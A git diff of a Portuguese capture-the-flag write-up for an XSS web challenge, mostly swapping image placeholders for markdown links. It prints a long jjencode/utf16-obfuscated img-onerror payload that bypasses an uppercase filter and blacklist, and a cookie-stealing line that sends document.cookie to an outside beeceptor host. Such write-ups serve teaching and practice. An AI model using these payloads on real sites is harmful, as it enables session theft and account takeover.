@@ -3,22 +3,21 @@
 **Categoria: Web**
 
 # Descrição:
-> (imagem_chall.pnh)
+![Chall](warz0ne_chall.png)
 
 # Solução
 Acessando o desafio obtemos uma página com um input disponível, onde ao preenchido e clicar em submit o valor inserido é transcrito para página.
-(imagem.png)
+![TestandoValores](warz0ne1_w.png)
 
 Analisando o código-fonte da página, encontramos um javascript:
-(imagem.png)
+![Javascript](warz0ne2.png)
 
-De forma grosseira, esse javascript recebe o valor do input e o transforma em uppercase, por fim transcreve esse último para a página:
-(imagem.png)
+De forma grosseira, esse javascript recebe o valor do input e o transforma em uppercase, por fim transcreve esse último para a página, como visto acima.
 
 Sabendo disso, levantamos uma possível blacklist (tudo que é digitado é desconsiderado, ou seja, não é executado):
-(imagem.png)
+![BlackList](warz0ne3.png)
 
-Da blacklist, procurei alguns bypass no Google e encontrei alguns encodes: utf16 (https://xssor.io/) e jjencode (http://utf-8.jp/public/jjencode.html).
+Da blacklist, procurei alguns bypass, já que alguns comandos do javascript não funcionam quando estão em UPPERCASE, no Google e encontrei alguns encodes: utf16 (https://xssor.io/) e jjencode (http://utf-8.jp/public/jjencode.html).
 
 Usando tais encodes, consegui construir um payload para executar um alert(1):
 
@@ -27,7 +26,7 @@ Usando tais encodes, consegui construir um payload para executar um alert(1):
 ```<\u0069\u006d\u0067 \u0073\u0072\u0063=x \u006f\u006e\u0065\u0072\u0072\u006f\u0072=\u0024\u003d\u007e\u005b\u005d\u003b\u0024\u003d\u007b\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u0024\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u005f\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u0024\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u0024\u003a\u0028\u0024\u005b\u0024\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u005f\u003a\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u005f\u005f\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u007d\u003b\u0024\u002e\u0024\u005f\u003d\u0028\u0024\u002e\u0024\u005f\u003d\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u0024\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u0024\u003d\u0028\u0024\u002e\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0028\u0021\u0024\u0029\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u005f\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u0024\u005f\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u005f\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u0029\u002b\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u0024\u003b\u0024\u002e\u0024\u0024\u003d\u0024\u002e\u0024\u002b\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u002b\u0024\u002e\u0024\u002b\u0024\u002e\u0024\u0024\u003b\u0024\u002e\u0024\u003d\u0028\u0024\u002e\u005f\u005f\u005f\u0029\u005b\u0024\u002e\u0024\u005f\u005d\u005b\u0024\u002e\u0024\u005f\u005d\u003b\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0024\u002b\u0022\u005c\u0022\u0022\u002b\u0024\u002e\u0024\u005f\u0024\u005f\u002b\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0022\u0028\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0022\u0029\u0022\u002b\u0022\u005c\u0022\u0022\u0029\u0028\u0029\u0029\u0028\u0029\u003b>```
 
 Obs: o alert(1) foi encodado primeiramente com jjencode e depois com utf16.
-(imagem_alert.png)
+![AlertFuncional](warz0ne6.png)
 
 A partir da execução do alert(1), criei um payload para "roubar" o cookie do administrador:
 
@@ -38,12 +37,16 @@ A partir da execução do alert(1), criei um payload para "roubar" o cookie do a
 Obs: location='https://mlkzika.free.beeceptor.com/?cookie='+document.cookie foi encodado com jjencode e depois com utf16.
 
 E, por último, enviei para o administrador pela url: http://159.65.249.122:8585/contact
-(imagem.png)
+![Contact](warz0ne14.png)
 
-É apenas preciso quebrar o captcha (que pode ser usado um script que encontra-se nesse mesmo github) e passar a url: http://159.65.249.122:8585/?msg=PAYLOAD
+É apenas preciso quebrar o captcha (que pode ser usado um script que encontra-se nesse mesmo github):
+![QuebrandoCaptcha](warz0ne13.png)
+
+E para chegar na flag, devemos enviar o captcha quebrado e passar a url:
+http://159.65.249.122:8585/?msg=PAYLOAD
 
 E pronto!
-(imagem_flag.png)
+![Flag](warz0ne16.png)
 
 # Flag:
 ```HACKAFLAG{Insira_Um4_fl4g_4qu1}```
